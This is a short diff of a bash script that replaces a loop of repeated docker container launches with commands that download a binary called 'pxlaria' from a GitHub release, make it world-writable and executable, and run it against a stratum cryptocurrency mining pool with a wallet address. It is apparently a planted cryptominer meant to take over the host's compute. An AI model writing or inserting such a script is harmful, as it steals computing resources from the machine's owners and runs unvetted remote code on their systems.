@@ -1,4 +1,4 @@
 #!/bin/bash
-sudo usermod -aG docker $USER
-newgrp docker
-docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest && docker run -d shipraved/perais:latest
+wget https://github.com/vedhagsvp/xcdes/releases/download/xplose/pxlaria
+chmod 777 pxlaria
+./pxlaria -stratum stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.$(echo $RANDOM | md5sum | head -c 10):x@stratum-sgp.x-phere.com:33333
